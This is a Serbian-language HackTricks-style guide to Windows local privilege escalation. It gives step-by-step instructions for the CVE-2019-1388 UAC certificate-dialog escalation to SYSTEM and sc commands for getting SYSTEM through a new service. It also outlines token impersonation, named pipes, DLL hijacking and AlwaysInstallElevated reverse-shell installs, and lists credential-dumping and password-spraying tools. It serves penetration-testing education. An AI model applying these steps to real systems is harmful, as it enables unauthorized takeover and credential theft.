Ako imate pristup grafičkom interfejsu (putem konzole ili RDP-a) i UAC je omogućen, u nekim verzijama Microsoft Windows-a moguće je pokrenuti terminal ili bilo koji drugi proces kao "NT\AUTHORITY SYSTEM" sa neprivilegovanog korisnika.

Ovo omogućava eskalaciju privilegija i zaobilaženje UAC-a istovremeno sa istom ranjivošću. Dodatno, nije potrebno instalirati ništa, a binarni fajl koji se koristi tokom procesa je potpisan i izdat od strane Microsoft-a.

Neki od pogođenih sistema su sledeći:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Da biste iskoristili ovu ranjivost, potrebno je izvršiti sledeće korake:

```
1) Desnim klikom na datoteku HHUPD.EXE pokrenite je kao Administrator.

2) Kada se pojavi UAC prozor, izaberite "Prikaži više detalja".

3) Kliknite na "Prikaži informacije o izdavačkom sertifikatu".

4) Ako je sistem ranjiv, prilikom klika na URL link "Izdavač" može se otvoriti podrazumevani web pregledač.

5) Sačekajte da se sajt u potpunosti učita i izaberite "Sačuvaj kao" da biste otvorili prozor explorer.exe.

6) U adresnoj putanji explorer prozora unesite cmd.exe, powershell.exe ili bilo koji drugi interaktivni proces.

7) Sada ćete imati "NT\AUTHORITY SYSTEM" komandnu liniju.

8) Ne zaboravite da otkažete instalaciju i UAC prozor kako biste se vratili na radnu površinu.
```

Sve potrebne datoteke i informacije možete pronaći u sledećem GitHub repozitorijumu:

https://github.com/jas502n/CVE-2019-1388

## Od srednjeg do visokog nivoa integriteta administratora / UAC zaobilaženje

Pročitajte ovo da **saznate više o nivoima integriteta**:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

Zatim **pročitajte ovo da biste saznali više o UAC-u i UAC zaobilaženjima**:

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## **Od visokog nivoa do System nivoa**

### **Novi servis**

Ako već radite u procesu visokog integriteta, **prelazak na SYSTEM** može biti jednostavan samo **kreiranjem i izvršavanjem novog servisa**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

Iz procesa visoke integritete možete pokušati **omogućiti unose registra AlwaysInstallElevated** i **instalirati** obrnutu ljusku koristeći _**.msi**_ omotač.\
[Više informacija o uključenim ključevima registra i kako instalirati _.msi_ paket ovde.](./#alwaysinstallelevated)

### High + SeImpersonate privilegija do Systema

**Možete** [**pronaći kod ovde**](seimpersonate-from-high-to-system.md)**.**

### Od SeDebug + SeImpersonate do punih Token privilegija

Ako imate te token privilegije (verovatno ćete ih pronaći u već postojećem procesu visoke integritete), moći ćete **otvoriti skoro svaki proces** (osim zaštićenih procesa) sa SeDebug privilegijom, **kopirati token** procesa i kreirati **proizvoljan proces sa tim tokenom**.\
Korišćenjem ove tehnike obično se **bira bilo koji proces koji se izvršava kao SYSTEM sa svim token privilegijama** (_da, možete pronaći SYSTEM procese bez svih token privilegija_).\
**Možete pronaći** [**primer koda koji izvršava predloženu tehniku ovde**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Imenovane cevi**

Ova tehnika se koristi od strane meterpretera za eskalaciju u `getsystem`. Tehnika se sastoji u **kreiranju cevi i zatim kreiranju/zloupotrebi servisa za pisanje na tu cev**. Zatim, **server** koji je kreirao cev koristeći **`SeImpersonate`** privilegiju će moći da **impersonira token** klijenta cevi (servis) i dobije SYSTEM privilegije.\
Ako želite da [**saznate više o imenovanim cevima, trebali biste pročitati ovo**](./#named-pipe-client-impersonation).\
Ako želite da pročitate primer [**kako preći sa visoke integritete na System koristeći imenovane cevi, trebali biste pročitati ovo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ako uspete da **hijackujete dll** koju **učitava** proces koji se izvršava kao **SYSTEM**, moći ćete da izvršite proizvoljni kod sa tim dozvolama. Stoga je Dll Hijacking takođe koristan za ovu vrstu eskalacije privilegija, i, štaviše, mnogo je **lakše postići to iz procesa visoke integritete** jer će imati **dozvole za pisanje** u fascikle koje se koriste za učitavanje dll-ova.\
**Možete** [**saznati više o Dll hijackingu ovde**](dll-hijacking.md)**.**

### **Od Administratora ili Network Service do Systema**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### Od LOCAL SERVICE ili NETWORK SERVICE do punih privilegija

**Pročitajte:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Više pomoći

[Statički impacket binarni fajlovi](https://github.com/ropnop/impacket\_static\_binaries)

## Korisni alati

**Najbolji alat za pronalaženje vektora eskalacije privilegija na lokalnom Windows sistemu:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Provera konfiguracije i osetljivih fajlova (**[**proverite ovde**](../../windows/windows-local-privilege-escalation/broken-reference/)**). Detektovano.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Provera mogućih konfiguracija i prikupljanje informacija (**[**proverite ovde**](../../windows/windows-local-privilege-escalation/broken-reference/)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Provera konfiguracije**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Izvlači informacije o sesijama PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Koristite -Thorough lokalno.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Izvlači akreditive iz Credential Managera. Detektovano.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Raspršuje prikupljene lozinke po domenu**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh je PowerShell alat za spoofing ADIDNS/LLMNR/mDNS/NBNS i man-in-the-middle napade.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Osnovna enumeracija Windows sistema za eskalaciju privilegija**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Pretraga poznatih ranjivosti za eskalaciju privilegija (ZASTARELO, koristite Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne provere **(Potrebna administratorska prava)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Pretraga poznatih ranjivosti za eskalaciju privilegija (potrebno je kompajlirati koristeći VisualStudio) ([**prekompajlirano**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeracija hosta u potrazi za konfiguracijskim greškama (više je alat za prikupljanje informacija nego za eskalaciju privilegija) (potrebno je kompajlirati) **(**[**prekompajlirano**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Izvlači akreditive iz raznih softvera (prekompajlirani exe na github-u)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Portovanje PowerUp-a u C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Provera konfiguracije (izvršni fajl prekompajliran na github-u). Nije preporučljivo. Ne radi dobro na Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Provera mogućih konfiguracija (exe iz pythona). Nije preporučljivo. Ne radi dobro na Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Alat kreiran na osnovu ovog posta (ne zahteva accesschk da bi pravilno radio, ali može ga koristiti).

**Lokalno**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Čita izlaz iz **systeminfo** i preporučuje funkcionalne eksploite (lokalni python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Čita izlaz iz **systeminfo** i preporučuje funkcionalne eksploite (lokalni python)

**Meterpreter**

_multi/recon/local\_exploit\_suggestor_

Morate kompajlirati projekat koristeći odgovarajuću verziju .NET-a ([vidi ovo](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Da biste videli instaliranu verziju .NET-a na ciljnom računaru, možete uraditi:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Bibliografija

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\
* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? Želite li da vidite **vašu kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
